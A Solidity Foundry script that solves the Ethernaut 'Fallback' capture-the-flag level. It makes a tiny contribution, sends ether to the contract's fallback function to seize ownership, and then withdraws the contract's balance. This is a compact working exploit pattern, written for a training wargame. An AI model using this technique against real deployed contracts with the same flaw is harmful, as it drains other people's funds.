// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../utils/Ethernaut.sol";
import "./Fallback.sol";

contract FallbackSolver is Test, Ethernaut {
    function run() public {
        IS_TEST = false;
        test();
    }

    function test() public broadcasted {
        Fallback instance = Fallback(getLevelInstance(Levels.fallback_));

        instance.contribute{ value: 1 }();
        address(instance).call{ value: 1 }("");
        instance.withdraw();

        require(validateLevelInstance(Levels.fallback_, address(instance)), "no validation");

        if (!IS_TEST) submitLevelInstance(address(instance));
    }
}
